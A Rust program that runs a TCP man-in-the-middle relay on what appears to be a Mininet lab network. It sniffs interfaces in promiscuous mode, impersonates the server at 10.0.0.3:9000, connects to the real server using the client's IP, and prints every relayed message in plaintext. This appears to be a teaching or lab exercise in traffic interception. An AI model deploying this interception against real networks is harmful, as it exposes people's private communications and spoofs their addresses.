use pcap::{Capture, Device};
use tokio::io::{split, AsyncReadExt, AsyncWriteExt};
use smoltcp::{
    phy::DeviceCapabilities,
    wire::{EthernetAddress, IpAddress, IpCidr},
};
use tokio_smoltcp::{device::AsyncDevice, smoltcp::iface, Net, NetConfig};
use anyhow::{anyhow, Context, Ok, Result};

const DEVICE_CONNECTED_TO_SERVER: &str = "mid_h-eth1";
const DEVICE_CONNECTED_TO_CLIENT: &str = "mid_h-eth0";
const SERVER_IP: &str = "10.0.0.3/8";
const SERVER_SOCET_ADDR: &str = "10.0.0.3:9000";
const GATEWAY: &str = "10.0.0.1";

#[cfg(unix)]
fn get_by_device(device: Device) -> Result<impl AsyncDevice> {
    use std::io;
    use tokio_smoltcp::device::AsyncCapture;

    let cap = Capture::from_device(device.clone())
        .context("Failed to capture device")?
        .promisc(true)
        .immediate_mode(true)
        .timeout(5)
        .open()
        .context("Failed to open device")?;

    fn map_err(e: pcap::Error) -> io::Error {
        match e {
            pcap::Error::IoError(e) => e.into(),
            pcap::Error::TimeoutExpired => io::ErrorKind::WouldBlock.into(),
            other => io::Error::new(io::ErrorKind::Other, other),
        }
    }
    let mut caps = DeviceCapabilities::default();
    caps.max_burst_size = Some(100);
    caps.max_transmission_unit = 1500;

    Ok(AsyncCapture::new(
        cap.setnonblock().context("Failed to set nonblock")?,
        |d| {
            let r = d.next_packet().map_err(map_err).map(|p| p.to_vec());
            // eprintln!("recv {:?}", r);
            r
        },
        |d, pkt| {
            let r = d.sendpacket(pkt).map_err(map_err);
            // eprintln!("send {:?}", r);
            r
        },
        caps,
    )
    .context("Failed to create async capture")?)
}

async fn man_in_the_middle(client_to_mid: tokio_smoltcp::TcpStream, server_to_mid: tokio_smoltcp::TcpStream, client_addr: std::net::SocketAddr) -> Result<()> {
    fn vec_to_string(buffer: &Vec<u8>, bytes_read: usize) -> String{
        let chars: Vec<char> = buffer[..bytes_read].iter().map(|&x| x as u8 as char).collect();
        let result: String = chars.into_iter().collect();
        result        
    }

    let mut buffer = vec![0; 1024];


    let (mut client_reader, mut client_writer) = split(client_to_mid);
    let (mut server_reader,mut server_writer) = split(server_to_mid);

    loop{
        let mut bytes_read = client_reader.read(&mut buffer).await?;
        if bytes_read == 0 {
            println!("connection to {} closed",client_addr);
            break;
        }

        println!("|\n| {} -> {}\n| bytes : {} \n| message : {}\n|_",client_addr,SERVER_SOCET_ADDR,bytes_read, vec_to_string(&buffer,bytes_read));

        server_writer.write_all(&buffer[..bytes_read]).await?;
        bytes_read = server_reader.read(&mut buffer).await?;

        
        println!("|\n| {} -> {}\n| bytes : {} \n| message : {}\n|_",SERVER_SOCET_ADDR,client_addr,bytes_read, vec_to_string(&buffer,bytes_read));
        
        client_writer.write_all(&buffer[..bytes_read]).await?;
    }
    Ok(())
}

async fn client_connect(client_addr: std::net::SocketAddr, client_tcp_stream: tokio_smoltcp::TcpStream) -> Result<()>{
    let mac = match mac_address::get_mac_address()? {
        Some(mac) => mac.to_string(),
        _mac_address_error => {
            panic!("Failed to retrieve MAC address");
        }
    };
    let ip_addr = client_addr.ip();
    let server_device = Device::list()?
        .into_iter()
        .find(|d| d.name == DEVICE_CONNECTED_TO_SERVER)
        .ok_or(anyhow!("Device not found"))?;
    let ethernet_addr: EthernetAddress = mac.parse().unwrap();
    let ip_addr: IpCidr = IpCidr::new(ip_addr.into(),0);
    let gateway: IpAddress = GATEWAY.parse().unwrap();
    let server_device = get_by_device(server_device)?;
    let interface_config = iface::Config::new(ethernet_addr.into());
    let server_net = Net::new(
        server_device,
        NetConfig::new(interface_config, ip_addr, vec![gateway]),
    );

    let server_tcp_stream = server_net.tcp_connect(SERVER_SOCET_ADDR.parse()?).await?;    
    
    if let Err(e) = man_in_the_middle(client_tcp_stream, server_tcp_stream, client_addr).await {
        eprintln!("Error {:?}", e);
    }
    Ok(())
}

async fn main_async() -> Result<()>{
    
    let mac = match mac_address::get_mac_address()? {
        Some(mac) => mac.to_string(),
        _mac_address_error => {
            panic!("Failed to retrieve MAC address");
        }
    };
    let client_device = Device::list()?
        .into_iter()
        .find(|d| d.name == DEVICE_CONNECTED_TO_CLIENT)
        .ok_or(anyhow!("Device not found"))?;
    let ethernet_addr: EthernetAddress = mac.parse().unwrap();
    let ip_addr: IpCidr = SERVER_IP.parse().unwrap();
    let gateway: IpAddress = GATEWAY.parse().unwrap();
    let client_device = get_by_device(client_device)?;
    let interface_config = iface::Config::new(ethernet_addr.into());
    let client_net = Net::new(
        client_device,
        NetConfig::new(interface_config, ip_addr, vec![gateway]),
    );
        
    let mut listener = client_net.tcp_bind(SERVER_SOCET_ADDR.parse().unwrap()).await?;

    loop{
        println!("wait for connect");

        let (tcp, addr) = listener.accept().await?;
        tokio::spawn(async move{
            if let Err(e) = client_connect(addr, tcp).await {
                eprintln!("Error {:?}", e);
            }
        });
    }
    //Ok(())  
}

#[tokio::main]
async fn main() -> Result<()>{
    if let Err(e) = main_async().await {
        eprintln!("Error {:?}", e);
    }
    Ok(())
}